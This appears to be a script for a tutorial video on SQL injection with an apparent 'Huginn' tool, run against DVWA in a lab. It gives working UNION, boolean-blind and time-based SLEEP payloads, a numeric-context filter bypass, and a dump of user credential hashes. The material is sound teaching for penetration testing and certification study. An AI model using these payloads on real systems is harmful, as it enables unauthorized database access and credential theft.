# VIDEO 28: SQL Injection
### In-Band, Blind & Second-Order SQLi Testing
**Suggested length:** 18–22 minutes
**License Tier:** Free
**Certification Relevance:** OSCP: Web Application Attacks | CEH: Web Application Hacking

---

## INTRO (0:00 – 1:45)

**[Screen: Huginn splash screen with Section 5 title card "Web Application Exploitation"]**

> "Welcome to Section 5 of the Huginn tutorial series — Web Application Exploitation. This is where we move from reconnaissance and scanning into active exploitation of web vulnerabilities. In this video, we're covering SQL injection — consistently ranked in the OWASP Top 10 and one of the most devastating web application vulnerabilities you'll encounter."

**[Screen: Warning banner — red background with white text: "⚠️ LAB ENVIRONMENT ONLY — ETHICAL TESTING DISCLAIMER"]**

> "Before we begin — a critical reminder. Everything demonstrated in this video is performed against DVWA, the Damn Vulnerable Web Application, running in an isolated lab environment that I own and control. SQL injection against systems you don't have explicit written authorization to test is illegal. This includes databases, websites, and applications belonging to others. Use these techniques only in authorized penetration tests, CTF challenges, or your own lab environments. Unauthorized access to computer systems violates the Computer Fraud and Abuse Act and equivalent laws worldwide."

**[Screen: Slide showing three SQLi categories — In-Band (UNION), Blind (Boolean), Blind (Time-Based) with brief descriptions]**

> "We'll cover three main categories of SQL injection today. In-band injection using UNION SELECT — where results come back directly in the page. Boolean-based blind injection — where we infer data by asking true/false questions. And time-based blind injection — where we use database sleep functions to extract data one bit at a time. We'll start at DVWA Security Level Low for clear demonstrations, then escalate to Medium to show filter bypass techniques. If you haven't seen Video 10 on HTTP/S Fingerprinting or Video 24 on Scanner Overview, those provide useful background (see Video 10: HTTP/S Fingerprinting) (see Video 24: Scanner Overview & Profiles)."

---

## SECTION 1: SQL Injection Fundamentals (1:45 – 4:00)

**[Screen: Diagram showing web application architecture — Browser → Web Server → Application Code → SQL Query → Database]**

> "SQL injection occurs when user-supplied input is concatenated directly into a SQL query without proper sanitization or parameterized queries. The application trusts the input and passes it straight to the database engine. An attacker manipulates this by injecting SQL syntax that alters the query's logic."

**[Screen: Code snippet showing vulnerable PHP code — `$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";`]**

> "Here's what vulnerable code looks like. The application takes a user-supplied ID parameter and drops it directly into the SQL string. There's no input validation, no parameterized query, no prepared statement. Whatever the user types becomes part of the SQL command."

**[Screen: Animated diagram showing normal query vs injected query — normal: `WHERE id = '1'` vs injected: `WHERE id = '1' OR '1'='1'`]**

> "When we supply a normal value like 1, the query behaves as expected — returns one row. But when we inject `1' OR '1'='1`, the query logic changes. The OR condition is always true, so the database returns every row in the table. That's the fundamental principle — we're breaking out of the data context and into the command context."

**[Screen: Table showing SQLi impact levels — Data Disclosure, Authentication Bypass, Data Modification, Remote Code Execution, Full Server Compromise]**

> "The impact ranges from data disclosure to full server compromise. With UNION-based injection, you can read any table in the database. With stacked queries on some database engines, you can modify data, create accounts, or even execute operating system commands through features like MySQL's LOAD_FILE or MSSQL's xp_cmdshell."

---

## SECTION 2: Huginn SQL Injection Interface (4:00 – 6:00)

**[Screen: Huginn application — navigating from Home → Web Exploits → SQL Injection panel]**

> "Let's open Huginn and navigate to the SQL injection module. From the home screen, select Web Exploits in the sidebar, then click the SQL Injection tab. This brings up the dedicated SQL injection testing component with the target configuration and payload management."

**[Screen: SQL Injection component — highlighting the Target URL field, Injection Type dropdown, Custom Payload field]**

> "The interface has three main sections. At the top, the Target URL field where you enter the vulnerable endpoint. Below that, the Injection Type dropdown with options for Basic, Union, Blind, Time-based, and Error-based testing. Each type loads a curated set of payloads tailored to that technique. There's also a Custom Payload field for when you want to craft something specific."

**[Screen: SQL Injection component — highlighting the Auto-detect database type checkbox and the Start button]**

> "The Auto-detect database type checkbox tells Huginn to fingerprint the backend database — MySQL, MSSQL, PostgreSQL, Oracle — before running type-specific payloads. This matters because different databases use different syntax. MySQL uses comment dashes and backticks, MSSQL uses square brackets and WAITFOR DELAY, PostgreSQL uses dollar-quoted strings. Leave this checked for automated testing."

**[Screen: SQL Injection component — showing the results output pane below]**

> "The results pane at the bottom shows real-time output as payloads are tested. You'll see each payload submitted, the response analysis, and vulnerability confirmations with severity ratings. Critical findings get flagged immediately with the specific payload that triggered them."

---

## SECTION 3: DVWA Setup and Basic SQLi — Security Low (6:00 – 9:30)

**[Screen: Browser showing DVWA login page — admin/password credentials being entered]**

> "Let's set up our target. Open DVWA in your browser — if you followed the setup guide, it's running at localhost on port 80. Log in with the default credentials admin/password. Navigate to DVWA Security in the left menu and confirm the security level is set to Low."

```bash
# DVWA access
URL: http://localhost/dvwa/
Credentials: admin / password
Security Level: Low
```

**[Screen: DVWA — navigating to SQL Injection module from the left sidebar]**

> "Click SQL Injection in the left sidebar. You'll see a simple form with a User ID input field and a Submit button. This form takes a numeric ID and queries the database for that user's information. At Low security, there is zero input filtering — anything we type goes directly into the query."

**[Screen: DVWA SQL Injection page — entering "1" in the User ID field, showing normal results]**

> "First, let's see normal behavior. Enter 1 and click Submit. The application returns user information — ID, first name, and surname for user 1. This confirms the form is working and we know what a normal response looks like."

```bash
# Normal query behavior
Input: 1
Result: ID: 1, First name: admin, Surname: admin
```

**[Screen: DVWA SQL Injection page — entering "1' OR '1'='1" in the User ID field]**

> "Now let's inject. Enter `1' OR '1'='1` and submit. The single quote closes the original string parameter, OR adds a new condition, and `'1'='1'` is always true. Watch the response."

```bash
# Basic SQLi — Authentication bypass / data dump
Input: 1' OR '1'='1
Result: All user records returned (5 rows)
  ID: 1, First name: admin, Surname: admin
  ID: 2, First name: Gordon, Surname: Brown
  ID: 3, First name: Hack, Surname: Me
  ID: 4, First name: Pablo, Surname: Picasso
  ID: 5, First name: Bob, Surname: Smith
```

**[Screen: Results showing all 5 user records dumped — highlighting that the OR condition returned every row]**

> "There it is. Instead of one record, we got all five users in the table. The query became `SELECT * FROM users WHERE id = '1' OR '1'='1'` — the WHERE clause is always true, so every row matches. We've confirmed the injection point. Now let's escalate."

---

## SECTION 4: UNION-Based Injection — Data Extraction (9:30 – 13:00)

**[Screen: Terminal showing Huginn SQL injection tool being configured — Target URL set to DVWA endpoint]**

> "UNION-based injection lets us append our own SELECT statement to the original query, pulling data from any table in the database. The key requirement is matching the number of columns in the original query. Let's figure out how many columns we're working with."

```bash
# Step 1: Determine number of columns using ORDER BY
Input: 1' ORDER BY 1-- -
Result: Normal response (column 1 exists)

Input: 1' ORDER BY 2-- -
Result: Normal response (column 2 exists)

Input: 1' ORDER BY 3-- -
Result: Error — "Unknown column '3' in 'order clause'"
# Conclusion: Original query has 2 columns
```

**[Screen: DVWA showing error response on ORDER BY 3 — confirming 2 columns]**

> "ORDER BY incrementally tests column positions. It worked for 1 and 2 but errored on 3 — so the original query returns exactly 2 columns. Now we know our UNION SELECT needs exactly 2 values."

**[Screen: DVWA SQL Injection page — entering UNION SELECT payload to extract database version]**

> "With the column count confirmed, let's use UNION SELECT to pull database metadata. We'll extract the MySQL version and the current database name."

```bash
# Step 2: Extract database version and name
Input: 1' UNION SELECT version(), database()-- -
Result:
  ID: 1, First name: admin, Surname: admin
  ID: [version], First name: 5.7.40, Surname: dvwa
```

**[Screen: Results showing MySQL version 5.7.40 and database name "dvwa" returned in the injected row]**

> "The UNION SELECT output appears as an additional row. MySQL version 5.7.40, current database is dvwa. Now let's enumerate all tables in this database."

```bash
# Step 3: Enumerate tables in the database
Input: 1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'-- -
Result:
  First name: guestbook, Surname: dvwa
  First name: users, Surname: dvwa
```

**[Screen: Results showing tables "guestbook" and "users" in the dvwa database]**

> "Two tables — guestbook and users. The users table is our target. Let's enumerate its columns."

```bash
# Step 4: Enumerate columns in the users table
Input: 1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' AND table_schema='dvwa'-- -
Result:
  First name: user_id, Surname: int
  First name: first_name, Surname: varchar
  First name: last_name, Surname: varchar
  First name: user, Surname: varchar
  First name: password, Surname: varchar
  First name: avatar, Surname: varchar
```

**[Screen: Results showing column names including "user" and "password" — highlighted]**

> "There's a user column and a password column. Let's extract the credentials."

```bash
# Step 5: Extract credentials
Input: 1' UNION SELECT user, password FROM users-- -
Result:
  First name: admin, Surname: 5f4dcc3b5aa765d61d8327deb882cf99
  First name: gordonb, Surname: e99a18c428cb38d5f260853678922e03
  First name: 1337, Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
  First name: pablo, Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
  First name: smithy, Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

**[Screen: Results showing all usernames and MD5 password hashes — highlighting the admin hash]**

> "Full credential dump. Those are MD5 hashes — admin's hash 5f4dcc3b5aa765d61d8327deb882cf99 is the MD5 of 'password'. In a real engagement, you'd take these hashes offline for cracking — we'll cover that in the Hash Cracking video later in the series. This is a complete database compromise from a single input field."

---

## SECTION 5: Blind Boolean-Based Injection (13:00 – 15:30)

**[Screen: Slide explaining blind SQLi concept — "No data returned in page, but behavior changes based on true/false conditions"]**

> "Not every injection point returns data directly in the page. In blind SQL injection, the application responds differently based on whether a condition is true or false — but doesn't show the actual data. You extract information one character at a time by asking yes/no questions."

**[Screen: DVWA SQL Injection (Blind) module — showing the different page layout that only returns "User ID exists" or nothing]**

> "DVWA has a separate Blind SQL Injection module for this. The page either says 'User ID exists in the database' or shows nothing. There's no data output — just a binary response. Let's navigate there now."

```bash
# Boolean-based blind SQLi — Testing true/false conditions
# True condition (page returns "exists"):
Input: 1' AND 1=1-- -
Result: "User ID exists in the database." (TRUE response)

# False condition (page returns nothing):
Input: 1' AND 1=2-- -
Result: (empty page — FALSE response)
```

**[Screen: Side-by-side comparison — TRUE response shows text, FALSE response shows blank area]**

> "We've confirmed blind injection. When the condition is true, we get the 'exists' message. When false, nothing. Now we extract data character by character. Let's determine the length of the database name first."

```bash
# Determine database name length
Input: 1' AND LENGTH(database())=4-- -
Result: "User ID exists" (TRUE — database name is 4 characters)

# Extract database name character by character
Input: 1' AND SUBSTRING(database(),1,1)='d'-- -
Result: TRUE → first character is 'd'

Input: 1' AND SUBSTRING(database(),2,1)='v'-- -
Result: TRUE → second character is 'v'

Input: 1' AND SUBSTRING(database(),3,1)='w'-- -
Result: TRUE → third character is 'w'

Input: 1' AND SUBSTRING(database(),4,1)='a'-- -
Result: TRUE → fourth character is 'a'

# Database name: dvwa (confirmed)
```

**[Screen: Huginn's SQL injection tool running automated blind extraction — progress indicator showing character-by-character enumeration]**

> "Manually this is tedious — each character requires multiple requests to find the right value. This is where Huginn's automated Blind injection mode shines. Set the type to Blind, provide the target URL, and Huginn iterates through characters systematically, building up the extracted value. The tool uses binary search to minimize the number of requests — testing midpoint ASCII values rather than checking every possible character sequentially."

---

## SECTION 6: Time-Based Blind Injection (15:30 – 17:30)

**[Screen: Slide explaining time-based blind — "When there's NO visible difference between true/false responses"]**

> "Sometimes there's no visible difference in the response at all — same content, same status code regardless of true or false. Time-based blind injection uses database sleep functions to create a measurable delay. If the condition is true, the server takes 5 seconds to respond. If false, it responds immediately."

**[Screen: DVWA SQL Injection page — demonstrating time-based approach]**

> "Let's use DVWA's standard injection page but with a time-based approach. We'll use MySQL's SLEEP function to validate injection."

```bash
# Time-based blind SQLi — Using SLEEP to confirm injection
Input: 1' AND SLEEP(5)-- -
Result: Response delayed by ~5 seconds (confirms injection)

# Conditional time-based extraction
Input: 1' AND IF(LENGTH(database())=4, SLEEP(5), 0)-- -
Result: 5-second delay → database name length is 4 (TRUE)

Input: 1' AND IF(LENGTH(database())=5, SLEEP(5), 0)-- -
Result: Immediate response → length is NOT 5 (FALSE)

# Character extraction with timing
Input: 1' AND IF(SUBSTRING(database(),1,1)='d', SLEEP(3), 0)-- -
Result: 3-second delay → first character confirmed as 'd'
```

**[Screen: Huginn SQL injection tool — Time-based mode selected, showing timing measurements in output]**

> "Huginn's time-based mode measures response times automatically. It sends conditional SLEEP payloads and records whether each response took longer than the threshold — typically 5 seconds. The tradeoff is speed — time-based extraction is significantly slower than UNION or boolean-based because each request must wait for the full sleep duration. A 10-character value with 3-second sleeps takes at minimum 30 seconds of response time alone."

**[Screen: Output showing timing comparison — normal responses at 200ms vs delayed responses at 5200ms]**

> "In the output, you can see the timing difference clearly. Normal responses come back in under 300 milliseconds. Responses where the condition was true show 5+ second delays. This timing differential is the entire detection mechanism."

---

## SECTION 7: Security Level Medium — Filter Bypass (17:30 – 20:00)

**[Screen: DVWA Security settings — changing from Low to Medium]**

> "Now let's raise the difficulty. Navigate to DVWA Security and change the level to Medium. At Medium security, the application uses the mysql_real_escape_string function to escape special characters in string inputs, and the input is submitted via a dropdown rather than a free text field."

**[Screen: DVWA SQL Injection page at Medium — showing the dropdown instead of text input]**

> "Notice the interface changed from a text input to a dropdown select box. This is a client-side restriction only — it doesn't prevent injection. We'll intercept the request and modify the parameter value. The real defense is the escape function on the backend."

```bash
# Medium Security — Numeric context injection (no quotes needed)
# The query at Medium uses numeric context: WHERE id = $id (no quotes)
# mysql_real_escape_string escapes quotes, but we don't need quotes!

# Intercepted POST request — modifying the 'id' parameter:
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=1 OR 1=1&Submit=Submit
```

**[Screen: Huginn HTTP Interceptor or Burp Suite — modifying the POST parameter value]**

> "The key insight at Medium security is that the variable is used in a numeric context — no quotes around it in the SQL query. The escape function protects against string-based injection but does nothing for integer context. We simply inject without quotes. Intercept the POST request and change the id parameter from 1 to `1 OR 1=1`."

```bash
# Numeric UNION injection (no quotes needed)
id=1 UNION SELECT user, password FROM users-- -&Submit=Submit
Result: All credentials returned (same as Low, different syntax)

# The escape function is irrelevant because we never use quotes
# Medium defense bypassed by exploiting the numeric context
```

**[Screen: Results showing successful data extraction at Medium security level — same credential dump]**

> "Same result — full credential dump. The lesson here is that escaping alone is insufficient when the injection point is in a numeric context. The only proper defense is parameterized queries with prepared statements — or at minimum, strict integer type casting for numeric parameters."

---

## SECTION 8: Certification Mapping and Practice (20:00 – 21:00)

**[Screen: Slide showing OSCP and CEH mapping for SQL injection]**

> "SQL injection maps directly to the OSCP Web Application Attacks domain. On the exam, you may encounter SQL injection on web-facing services that gate access to further exploitation. The ability to extract credentials or achieve command execution through SQLi is a common pathway. For CEH, this falls under Module 14 — Hacking Web Applications, specifically the SQL injection attack vectors section."

**[Screen: Slide listing practice resources — HTB machines, THM rooms]**

> "For practice, try the TryHackMe SQL Injection room for structured learning, and Hack The Box machines like 'Validation' and 'GoodGames' which feature SQL injection as part of their attack chain. DVWA at High and Impossible security levels show progressively better defenses — study Impossible to understand proper parameterized query implementation."

---

## OUTRO (21:00 – end)

**[Screen: Summary slide — SQL Injection: UNION-Based, Boolean Blind, Time-Based Blind | Filter Bypass at Medium | Next: Video 29 — Cross-Site Scripting (XSS)]**

> "That's SQL injection in Huginn. We covered UNION-based extraction for direct data access, boolean-based blind for inferring data through true/false responses, time-based blind using SLEEP functions for completely blind scenarios, and filter bypass techniques at Medium security. In the next video, we'll tackle Cross-Site Scripting — reflected, stored, and DOM-based XSS. See you there."

